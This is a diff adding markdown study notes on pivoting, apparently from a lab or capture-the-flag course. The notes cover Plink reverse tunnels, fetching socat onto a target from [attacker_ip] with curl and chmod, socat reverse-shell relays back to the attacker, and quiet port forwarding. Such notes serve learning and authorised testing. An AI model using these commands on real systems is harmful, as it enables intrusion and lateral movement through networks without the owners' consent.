@@ -241,3 +241,72 @@ Reverse
     * -i to specify the private key
     * -f backgrounds the shell
     * -N doesn't execute commands
+
+# Task 12 - Pivoting - Plink
+Plink.exe is the Windows CLI version of Putty.  To use keys from ssh-keygen you need to convert them with puttygen, puttygen keyfile -o output.ppk
+
+To create a reverse connection:
+```
+cmd.exe /c echo y | .\plink.exe -R LOCAL_PORT:TARGET_IP:TARGET_PORT USERNAME@ATTACKING_IP -i KEYFILE -N
+```
+
+# Task 13 - Pivoting - Socat
+Socat is great for fully stable shells, but is often not installed.  
+
+Transfering socat:
+```
+attacker:
+sudo python3 -m http.server 80
+
+target:
+curl [attacker_ip]/socat -o /tmp/socat-username && chmod +x /tmp/socat-username
+```
+
+Reverse shell relay with socat:
+```
+attacker:
+sudo nc -nvlp 443
+
+target:
+./socat tcp-l:8000 tcp:[attacker_ip]:443 &
+```
+* tcp-l:8000 - creates a listener for port 8000
+* tcp:[attacker_ip]:443 - connects back to the attacking host
+* & - background the listener
+
+Port forwarding with socat:
+```
+target:
+./socat tcp-l:33060,fork,reuseaddr tcp:[target_ip]:3306 &
+```
+* tcp-l:33060 - creates a listener for port 33060
+* fork - put every connection into a new process
+* reuseaddr - port stays open after a connection is made to it
+* tcp:[target_ip]:3306 - connects to the target on port 3306
+* & - background the listener
+
+Port forwarding (quiet - no open ports) with socat:
+```
+attacker:
+socat tcp-l:8001 tcp-l:8000,fork,reuseaddr &
+```
+* create a local relay between 8001 and 8000 with reuse
+
+```
+target:
+./socat tcp:[attacker_ip]:8001 tcp:[target_ip]:80,fork &
+```
+* connection from the listening port 80 on the target and the attacker on 8001
+
+```
+attacker:
+request to localhost:8000
+```
+attacker > target flow
+* request to localhost 8000
+* go in 8000, come out 8001
+* 8001 is connected to the compromised server on port 80
+
+target > attacker flow
+* response sent to socat, which goes to 8001 on the attacker
+* inbound from 8001 of the target comes out 8000 on the attacker
